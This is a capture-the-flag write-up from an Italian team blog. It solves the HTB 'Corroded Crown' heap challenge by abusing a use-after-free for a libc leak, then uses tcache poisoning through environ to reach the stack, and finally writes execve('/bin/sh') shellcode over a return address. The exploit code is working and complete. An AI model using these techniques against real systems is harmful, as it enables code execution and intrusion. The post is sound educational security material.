@@ -1,0 +1,169 @@
+<!DOCTYPE html><html lang="it" data-astro-cid-sckkx6r4> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><meta name="generator" content="Astro v5.18.2"><link rel="canonical" href="https://pwnissa.it/blog/corrodedcrown/corrodedcrown/"><title>Corroded Crown: HTB Cyber Apocalpyse - The Salt Crown | Blog | Pwnissa</title><meta name="description" content="Articolo di AlexTheLlama @ Pwnissa"><meta name="og:title" content="Corroded Crown: HTB Cyber Apocalpyse - The Salt Crown | Blog | Pwnissa"><meta name="og:description" content="Articolo di AlexTheLlama @ Pwnissa"><meta property="og:image" content="https://pwnissa.it/og/blog/corrodedcrown/corrodedcrown.png"><meta property="og:url" content="https://pwnissa.it/blog/corrodedcrown/corrodedcrown/"><meta property="og:type" content="website"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="https://pwnissa.it/og/blog/corrodedcrown/corrodedcrown.png"><link rel="manifest" href="/site.webmanifest"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="apple-touch-icon" href="https://pwnissa.it/logo1.png"><!-- Defer Google Fonts loading to prevent render-blocking --><link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" media="print" onload="this.media='all'"><noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap"></noscript> <meta property="og:type" content="article"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.css" integrity="sha384-GvrOXuhMATgEsSwCs4smul74iXGOixntILdUW9XmUC6+HX0sLNAK3q71bZlF0160" crossorigin="anonymous"> <!-- Pixel Code for https://simplifyanalytics.app/ --><script defer src="https://simplifyanalytics.app/pixel/zDcCr0DG1O2iPWc2"></script><!-- END Pixel Code --><style>.article-content a:link{color:var(--accent-teal);text-decoration:underline;transition:color .3s ease}.article-content a:visited{color:var(--accent-gold)}.article-content a:hover{color:var(--accent-gold);text-decoration:none}.article-content a:active{color:var(--accent-gold)}.blog-container{max-width:1000px;margin:0 auto;padding:120px 20px 40px}@media(min-width:1024px){.blog-container{max-width:1200px;padding:140px 60px 40px}.article-content{padding:60px 80px}}.blog-header{margin-bottom:40px}.back-link{color:var(--accent-teal);text-decoration:none;font-weight:500;margin-bottom:20px;display:inline-block;transition:color .3s ease}.back-link:hover{color:var(--accent-gold)}.article-meta h1{font-size:2.5rem;font-weight:700;margin-bottom:20px;background:linear-gradient(135deg,var(--accent-gold),var(--accent-teal));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}.meta-info{display:flex;flex-wrap:wrap;gap:15px;align-items:center;margin-bottom:30px}.author,.date{color:var(--text-secondary)}.tags{display:flex;flex-wrap:wrap;gap:8px}.article-content{background:var(--card-bg);border:1px solid var(--card-border);border-radius:15px;padding:40px;backdrop-filter:blur(10px)}.article-content h2{font-size:1.8rem;margin:30px 0 15px;color:var(--accent-gold)}.article-content h3{font-size:1.4rem;margin:25px 0 10px;color:var(--accent-teal)}.article-content p{margin-bottom:15px;font-size:1.1rem;line-height:1.8}.article-content code{background:#0000004d;padding:2px 6px;border-radius:4px;font-family:JetBrains Mono,monospace;font-size:.9rem;color:var(--accent-gold)}.article-content pre{background:linear-gradient(135deg,#1a1a1a,#2d2d2d);padding:24px;border-radius:8px;overflow-x:auto;margin:24px 0;border:1px solid rgba(237,192,30,.2);box-shadow:0 4px 12px #0000004d;position:relative}.article-content pre:before{content:"";position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,var(--accent-gold),var(--accent-teal));border-radius:8px 8px 0 0}.article-content pre code{background:none;padding:0;color:#e6e6e6;font-family:JetBrains Mono,Fira Code,monospace;font-size:.9rem;line-height:1.6}.article-content pre code .keyword{color:#ff79c6;font-weight:600}.article-content pre code .string{color:#f1fa8c}.article-content pre code .comment{color:#6272a4;font-style:italic}.article-content pre code .function{color:#50fa7b}.article-content pre code .number{color:#bd93f9}.article-content pre code .operator{color:#ff79c6}.article-content ul,.article-content ol{margin-left:20px;margin-bottom:15px}.article-content li{margin-bottom:5px}.article-content blockquote{border-left:4px solid var(--accent-gold);padding-left:20px;margin:20px 0;font-style:italic;color:var(--text-secondary)}.article-content img{max-width:100%;height:auto;border-radius:8px;margin:20px 0;box-shadow:0 4px 12px #0000004d;border:1px solid var(--card-border);display:block}@media(max-width:768px){.article-meta h1{font-size:2rem}.article-content{padding:20px}.meta-info{flex-direction:column;align-items:flex-start}}
+</style>
+<link rel="stylesheet" href="/_astro/_slug_.CcdPEHG1.css"><style>.callout[data-astro-cid-mrmim4ef]{background:var(--bgColor);border:1px solid var(--borderColor);border-left:4px solid var(--borderColor);border-radius:8px;margin:24px 0;padding:0;backdrop-filter:blur(10px);transition:all .3s ease}.callout[data-astro-cid-mrmim4ef]:hover{box-shadow:0 4px 12px #0003;transform:translateY(-1px)}.callout-header[data-astro-cid-mrmim4ef]{display:flex;align-items:center;gap:12px;padding:16px 20px 12px;border-bottom:1px solid rgba(255,255,255,.1)}.callout-icon[data-astro-cid-mrmim4ef]{font-size:1.2rem;color:var(--iconColor)}.callout-title[data-astro-cid-mrmim4ef]{font-weight:600;font-size:1rem;color:var(--iconColor);text-transform:uppercase;letter-spacing:.5px}.callout-content[data-astro-cid-mrmim4ef]{padding:16px 20px 20px;color:var(--text-primary)}.callout-content[data-astro-cid-mrmim4ef] p{margin:0 0 12px;line-height:1.6}.callout-content[data-astro-cid-mrmim4ef] p:last-child{margin-bottom:0}.callout-content[data-astro-cid-mrmim4ef] code{background:#0000004d;padding:2px 6px;border-radius:4px;font-family:JetBrains Mono,monospace;font-size:.85rem;color:var(--iconColor)}.callout-content[data-astro-cid-mrmim4ef] ul,.callout-content[data-astro-cid-mrmim4ef] ol{margin:12px 0;padding-left:20px}.callout-content[data-astro-cid-mrmim4ef] li{margin-bottom:6px}@media(max-width:768px){.callout-header[data-astro-cid-mrmim4ef]{padding:14px 16px 10px}.callout-content[data-astro-cid-mrmim4ef]{padding:14px 16px 18px}.callout-title[data-astro-cid-mrmim4ef]{font-size:.9rem}}
+</style></head> <body data-astro-cid-sckkx6r4>   <main class="blog-container"> <article class="blog-post"> <header class="post-header"> <div class="post-meta"> <div class="article-meta"> <h1>Corroded Crown: HTB Cyber Apocalpyse - The Salt Crown</h1> <div class="meta-info"> <span class="author">di AlexTheLlama</span> <span class="date">20/08/2026</span> <div class="tags"> <span class="tag pwn">pwn</span><span class="tag heap">heap</span><span class="tag tcache-poisoning">tcache poisoning</span><span class="tag shellcode">shellcode</span> </div> </div> </div> </div> </header> <div class="article-content">  <h2 id="writeup-corroded-crown---htb-pwn-challenge">Writeup Corroded Crown - HTB Pwn Challenge</h2>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="plaintext"><code><span class="line"><span>i don&#39;t remember the chall text, lmao, but it was really cool</span></span></code></pre>
+<h3 id="scouting-time-_">Scouting time (´•_•`;)</h3>
+<p>Looking at the decompiled code, you can see that, even though a pointer is freed in the <code>destroy_relic</code> function, the other functions <code>inscribe_relic</code> and <code>inspect_relic</code>, do not check whether the selected pointer has already been freed or not</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="plaintext"><code><span class="line"><span>//destroy_relic</span></span>
+<span class="line"><span>if ( is_used[16 * index] == 1 )</span></span>
+<span class="line"><span>  {</span></span>
+<span class="line"><span>    free(&amp;relic[index]);</span></span>
+<span class="line"><span>    is_used[16 * index] = 0;</span></span>
+<span class="line"><span>    puts(&quot;[!] The relic crumbles to ash. The mark lingers.&quot;);</span></span>
+<span class="line"><span>  }</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>// Inscribe_relic</span></span>
+<span class="line"><span>...</span></span>
+<span class="line"><span>printf(&quot;[?] Press your inscription into the metal (%d bytes):\n&quot;, *((_DWORD *)&amp;size + 4 * (int)index));</span></span>
+<span class="line"><span>  if ( !read(0, &amp;relic[index], &amp;size[index]) )</span></span>
+<span class="line"><span>    _exit(0);</span></span>
+<span class="line"><span>  puts(&quot;[+] The inscription has been pressed into the metal.&quot;);</span></span>
+<span class="line"><span>...</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>...</span></span>
+<span class="line"><span>// Inspect_relic</span></span>
+<span class="line"><span>printf(&quot;[*] Relic [%d]: &quot;, index);</span></span>
+<span class="line"><span>  write(1, &amp;relic[index], &amp;size[index]);</span></span>
+<span class="line"><span>  putchar(10);</span></span></code></pre>
+<p>This is a <strong>use-after-free</strong> vulnerability! We will need that later</p>
+<p>There are two other significant details:
+by running <code>checksec --file=corroded_crown</code> we can see that NX is disabled. Second, the .zip file contains a <code>glibc</code> directory, where we can find the libc version. In this case:</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">./ld-linux-x86-64.so.2</span><span style="color:#F1FA8C"> ./libc.so.6</span></span>
+<span class="line"><span style="color:#50FA7B">GNU</span><span style="color:#F1FA8C"> C</span><span style="color:#F1FA8C"> Library</span><span style="color:#F8F8F2"> (Ubuntu </span><span style="color:#F1FA8C">GLIBC</span><span style="color:#F1FA8C"> 2.31-0ubuntu9.17</span><span style="color:#F8F8F2">) stable release version 2.31.</span></span></code></pre>
+<p><em>Cool, Safe Linking is not available in this version of libc, so we can write raw pointers without needing an additional heap leak to bypass pointer mangling (XORing the pointer before writing it)</em></p>
+<hr/>
+<h3 id="exploitation-time-ヾㅅノ">Exploitation time ヾ(⌐■ㅅ■)ノ</h3>
+<p>A <strong>use-after-free</strong> vuln opens up to many exploiting tecniques, such as <strong>tcache poisoning</strong>.
+<em>Wait-! Before casting</em> <strong>tcache poisoning</strong> <em>I have to check my spellbook to remember how it’s done!</em></p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="plaintext"><code><span class="line"><span>STEP 1: Two chunks allocated (size 0x20)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>         chunk A                    chunk B</span></span>
+<span class="line"><span>    ┌──────────────┐          ┌──────────────┐</span></span>
+<span class="line"><span>    │  header: 0x21│          │  header: 0x21│</span></span>
+<span class="line"><span>    ├──────────────┤          ├──────────────┤</span></span>
+<span class="line"><span>    │  user data   │          │  user data   │</span></span>
+<span class="line"><span>    │              │          │              │</span></span>
+<span class="line"><span>    └──────────────┘          └──────────────┘</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>STEP 2: free(A), then free(B) -&gt; tcache LIFO</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    tcache[0x20] head</span></span>
+<span class="line"><span>         │</span></span>
+<span class="line"><span>         ▼</span></span>
+<span class="line"><span>    ┌──────────────┐    fd    ┌──────────────┐</span></span>
+<span class="line"><span>    │  chunk B     │─────────&gt;│  chunk A     │──&gt; NULL</span></span>
+<span class="line"><span>    │  fd = &amp;A     │          │  fd = 0x0    │</span></span>
+<span class="line"><span>    └──────────────┘          └──────────────┘</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>STEP 3: UAF write on chunk B -&gt; overwrite fd with TARGET</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    tcache[0x20] head</span></span>
+<span class="line"><span>         │</span></span>
+<span class="line"><span>         ▼</span></span>
+<span class="line"><span>    ┌──────────────┐    fd    ┌──────────────┐</span></span>
+<span class="line"><span>    │  chunk B     │─────────&gt;│  TARGET      │</span></span>
+<span class="line"><span>    │  fd = TARGET │          │  (anywhere)  │</span></span>
+<span class="line"><span>    └──────────────┘          └──────────────┘</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>STEP 4: malloc() -&gt; returns chunk B (head of list)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    tcache[0x20] head</span></span>
+<span class="line"><span>         │</span></span>
+<span class="line"><span>         ▼</span></span>
+<span class="line"><span>    ┌──────────────┐</span></span>
+<span class="line"><span>    │  TARGET      │──&gt; ???</span></span>
+<span class="line"><span>    │  (anywhere)  │</span></span>
+<span class="line"><span>    └──────────────┘</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>STEP 5: malloc() -&gt; returns TARGET address!</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    You now have a &quot;chunk&quot; at TARGET.</span></span>
+<span class="line"><span>    Writing to it = arbitrary write.</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    ┌──────────────────────────────┐</span></span>
+<span class="line"><span>    │  TARGET (e.g. return addr)   │</span></span>
+<span class="line"><span>    │  ┌────────────────────────┐  │</span></span>
+<span class="line"><span>    │  │ you control this data  │  │</span></span>
+<span class="line"><span>    │  └────────────────────────┘  │</span></span>
+<span class="line"><span>    └──────────────────────────────┘</span></span>
+<span class="line"><span></span></span></code></pre>
+<p>Then, we will likely end up writing shellcode since NX is disabled. Also, I’m a big fan of this photo, which contains the secret to unlocking the ultimate skill: <strong>Pivoting Around Memory</strong></p>
+<p><img src="/_astro/pivoting.D1Jfb-tV_Zg1Taf.webp" alt="Pivoting around memory from https://blog.osiris.cyber.nyu.edu/2019/04/06/pivoting-around-memory/" loading="lazy" decoding="async" fetchpriority="auto" width="714" height="343"></p>
+<p>From here, we have all we need to define a strategy.</p>
+<p>First, we need a libc leak. We can obtain that by leaking a pointer to <code>main_arena</code>, an area of the libc that tracks and manages the memory heap of the main thread. Since chunks in the unsorted bin have their forward and backward pointers pointing to <code>main_arena</code>, we can first forge a relic (large enough to go into the unsorted bin), destroy it, and then the use-after-free vuln to inspect it.</p>
+<p>To better visualize it, I cast: unsorted bin representation ヽ(╬☉Д⊙)ﾉ<br/>
+<img src="/_astro/unsorted.DKCOhw3h_mLIpo.webp" alt="i love to write cringe titles" loading="lazy" decoding="async" fetchpriority="auto" width="947" height="295"></p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="plaintext"><code><span class="line"><span>forge(2,1056)</span></span>
+<span class="line"><span>forge(3,32) # to prevent top chunk from absorbing the first chunk deallocated</span></span>
+<span class="line"><span>destroy(2)</span></span>
+<span class="line"><span>leak = u64(inspect(2).ljust(8,b&#39;\x00&#39;))</span></span></code></pre>
+<p>In your exploit, this will work just fine, but if you are debugging it with, for example, pwndbg, it’s better to stop before message is printed and look at the bins, then verify your assumptions with <code>vmmap</code></p>
+<p><img src="/_astro/pwntools.B9t0y5Ye_Z1WgtPN.webp" alt="pwndbg rules!" loading="lazy" decoding="async" fetchpriority="auto" width="1062" height="716"></p>
+<p><em>Cool, first leak obtained.</em></p>
+<p>Thanks to the secret knowledge from the image above, we know that we need <code>environ</code> to obtain a stack leak. But hey! What the hell is it? A 9th-level spell? An ultra-legendary sword? We must interrogate the Prophetic Unicorn!</p>
+<p><img src="/_astro/unicornsay.D9pUFw3v_TOfzx.webp" alt="The Prophetic Unicorn shares his knowledge" loading="lazy" decoding="async" fetchpriority="auto" width="1624" height="217"></p>
+<p><em>(TL;DR) is a variable in <code>libc</code> that contains a pointer to the stack. We can use it to leak the stack.</em></p>
+<p>Thanks Wise Unicorn. Now we can calculate <code>environ_address</code></p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="plaintext"><code><span class="line"><span>lbc_offset = 0x7ffff7fbfbe0 - 0x00007ffff7dd3000 # static values of libc leak - libc base</span></span>
+<span class="line"><span>libc_base = leak - lbc_offset</span></span>
+<span class="line"><span>environ_addr = libc_base + libc.symbols[&#39;environ&#39;]</span></span></code></pre>
+<h4 id="and-now-lets-poison-some-tcache-">And now, let’s poison some tcache (⌐■-■)</h4>
+<p>We allocate two 16 bytes memory chunks, so that when they are freed they will go to the <code>tcache</code>. Then, thanks to the <strong>use-after-free</strong> vuln, we inscribe the <code>environ</code> address into the last freed chunk. In this way, the forward pointer of the first chunk will be overwritten with the <code>environ</code> address. We forge two other chunks, so that the first one will be the actual list’s head and the other will be what it was pointing to. In our case, <code>environ</code> itself</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="plaintext"><code><span class="line"><span>forge(4,16)</span></span>
+<span class="line"><span>forge(5,16)</span></span>
+<span class="line"><span>destroy(4)</span></span>
+<span class="line"><span>destroy(5)</span></span>
+<span class="line"><span>inscribe(5,p64(environ_addr))</span></span>
+<span class="line"><span>forge(6,16)</span></span>
+<span class="line"><span>forge(7,16)</span></span>
+<span class="line"><span>stack_leak = u64(inspect(7).ljust(8,b&quot;\x00&quot;))</span></span></code></pre>
+<p><em>Note: Here we are writing the raw environ_addr directly into the freed chunk’s forward pointer. This  works because our libc is older than 2.32. If Safe-Linking was enabled, we would have needed an additional heap leak to bypass the pointer mangling (XORing the pointer before writing it).</em></p>
+<p>Inspecting it, will give us the contents of <code>environ</code>, our stack leak!
+<img src="/_astro/stackleak.DaLa3bjN_1xtGsI.webp" alt="I'm always right" loading="lazy" decoding="async" fetchpriority="auto" width="1262" height="667"></p>
+<p>With our juicy stack leak, we can calculate the return address of inscribe, since it will be the last function called to write the shellcode, and use it later to return to <code>return_address+8</code></p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="plaintext"><code><span class="line"><span># writing shellcode</span></span>
+<span class="line"><span>shellcode = &quot;&quot;&quot; </span></span>
+<span class="line"><span>   mov rax, 0x3b </span></span>
+<span class="line"><span>   xor rsi, rsi </span></span>
+<span class="line"><span>   xor rdx, rdx </span></span>
+<span class="line"><span>   lea rdi, [rip + binsh] </span></span>
+<span class="line"><span>   syscall </span></span>
+<span class="line"><span>   binsh: </span></span>
+<span class="line"><span>   .ascii &quot;/bin/sh&quot; </span></span>
+<span class="line"><span>   .byte 0x0 </span></span>
+<span class="line"><span>   &quot;&quot;&quot; </span></span>
+<span class="line"><span>payload=asm(shellcode)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># return address</span></span>
+<span class="line"><span>stack_offset = 0x00007fffffffd578 - 0x7fffffffd538 # static values of environ - return address of inscribe_relic</span></span>
+<span class="line"><span>ret_addr = stack_leak - stack_offset</span></span></code></pre>
+<p>Time for the last tcache poisoning<br/>
+As above, we forge and destroy  two chunks. We write the return address into the head chunk so that the second re-forged chunk starts at the return address, where it will be overwritten with the address at which our shellcode begins, <code>return_address+8</code>.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="plaintext"><code><span class="line"><span># chunk pointing to retrun address</span></span>
+<span class="line"><span>forge(12,48)</span></span>
+<span class="line"><span>forge(13,48)</span></span>
+<span class="line"><span>destroy(12)</span></span>
+<span class="line"><span>destroy(13)</span></span>
+<span class="line"><span>inscribe(13,p64(ret_addr))</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># writing shellcode on return address</span></span>
+<span class="line"><span>forge(14,48)</span></span>
+<span class="line"><span>forge(15,48)</span></span>
+<span class="line"><span>inscribe(15,p64(ret_addr+8)+payload)</span></span>
+<span class="line"><span>p.interactive()</span></span></code></pre>
+<p>And when <code>inscribe_relic</code> returns, boom, we pwned it  ヽ(^ ᗨ ^)ノ</p>
+<hr/>
+<h3 id="my-useless-thoughts">My useless thoughts</h3>
+<p>It was my first heap challenge and it was a fun one, since it was not super straightforward and helped me understand how the heap works (or, at least, part of it).
+Thanks to @Ub1k for the guidance, to @Serotav and @Marco for the learning material and to Rachele, the all-knowing eldritch entity, for reviewing my bad english!</p>
+<p>other useful links to learn about tcache poisoning:<br/>
+<a href="https://tripoloski1337.github.io/research/2019/09/09/tcache_poisoning.html">https://tripoloski1337.github.io/research/2019/09/09/tcache_poisoning.html</a></p>
+<p><a href="https://github.com/shellphish/how2heap">https://github.com/shellphish/how2heap</a></p>
+<p><a href="https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/">https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/</a></p>
+<p><a href="https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/">https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/</a></p>  </div> </article> </main>  <nav id="navbar" class="navbar" data-autohide="true" data-astro-cid-5blmo7yk> <div class="navbar-container" data-astro-cid-5blmo7yk> <div class="navbar-brand" data-astro-cid-5blmo7yk> <a href="/" data-astro-cid-5blmo7yk>Pwnissa</a> </div> <button class="hamburger" id="hamburger" aria-label="Toggle menu" data-astro-cid-5blmo7yk> <span data-astro-cid-5blmo7yk></span><span data-astro-cid-5blmo7yk></span><span data-astro-cid-5blmo7yk></span> </button> <div class="navbar-menu" id="navbar-menu" data-astro-cid-5blmo7yk> <a href="/members" class="navbar-link" target="_self" data-astro-cid-5blmo7yk>Members</a><a href="/blog" class="navbar-link" target="_self" data-astro-cid-5blmo7yk>Blog</a><div class="nav-item-dropdown" data-astro-cid-5blmo7yk> <button class="navbar-link dropdown-toggle" aria-haspopup="true" aria-expanded="false" data-astro-cid-5blmo7yk> Training <svg class="dropdown-icon" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" data-astro-cid-5blmo7yk><polyline points="6 9 12 15 18 9" data-astro-cid-5blmo7yk></polyline></svg> </button> <div class="dropdown-menu" data-astro-cid-5blmo7yk> <a href="/training/pwnissa-academy" class="dropdown-link" target="_self" data-astro-cid-5blmo7yk>Pwnissa Academy</a><a href="/training/cyberchallenge" class="dropdown-link" target="_self" data-astro-cid-5blmo7yk>CyberChallenge.IT</a> </div> </div> </div> </div> </nav> <script type="module">window.addEventListener("load",()=>{const t=document.getElementById("navbar");if(t?.classList.add("visible"),t?.dataset.autohide==="true"&&t){let e=window.scrollY;window.addEventListener("scroll",()=>{window.scrollY>e+5&&window.scrollY>t.offsetHeight?t.classList.add("hidden"):window.scrollY<e-5&&t.classList.remove("hidden"),e=window.scrollY})}const s=document.getElementById("hamburger"),d=document.getElementById("navbar-menu");s?.addEventListener("click",()=>{s.classList.toggle("is-active"),d?.classList.toggle("is-open")}),document.querySelectorAll(".dropdown-toggle").forEach(e=>{e.addEventListener("click",n=>{if(window.innerWidth<=768){n.preventDefault(),e.parentElement?.classList.toggle("is-active");const o=e.getAttribute("aria-expanded")==="true"||!1;e.setAttribute("aria-expanded",(!o).toString())}})})});</script>  <footer class="footer" data-astro-cid-sz7xmlte> <div class="footer-content" data-astro-cid-sz7xmlte> <div class="footer-grid" data-astro-cid-sz7xmlte> <div class="footer-brand" data-astro-cid-sz7xmlte> <h3 class="footer-logo" data-astro-cid-sz7xmlte>Pwnissa</h3> <p class="location" data-astro-cid-sz7xmlte>📍 Via Dodecaneso, Genova, Italy</p> </div> <div class="footer-links" data-astro-cid-sz7xmlte> <div class="social-links" data-astro-cid-sz7xmlte> <a href="mailto:info@pwnissa.it" aria-label="Email" class="social-link" data-astro-cid-sz7xmlte> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" data-astro-cid-sz7xmlte> <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z" data-astro-cid-sz7xmlte></path> <polyline points="22,6 12,13 2,6" data-astro-cid-sz7xmlte></polyline> </svg> </a> <a href="https://github.com/pwnissa" target="_blank" rel="noopener noreferrer" aria-label="GitHub" class="social-link" data-astro-cid-sz7xmlte> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" data-astro-cid-sz7xmlte> <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22" data-astro-cid-sz7xmlte></path> </svg> </a> <a href="https://ctftime.org/team/386813" target="_blank" rel="noopener noreferrer" aria-label="CTFTime" class="social-link" data-astro-cid-sz7xmlte> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" title="CTFTime" data-astro-cid-sz7xmlte> <path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z" data-astro-cid-sz7xmlte></path> <line x1="4" y1="22" x2="4" y2="15" data-astro-cid-sz7xmlte></line> </svg> </a> </div> </div> </div> <div class="footer-bottom" data-astro-cid-sz7xmlte> <p class="made-by" data-astro-cid-sz7xmlte>Made with ♥ by <a href="https://stealthguy.net" target="_blank" rel="noopener noreferrer" data-astro-cid-sz7xmlte>stealthguy</a> & <a href="https://blog.davidherm.es" target="_blank" rel="noopener noreferrer" data-astro-cid-sz7xmlte>ubik</a></p> </div> </div> </footer>  </body></html>
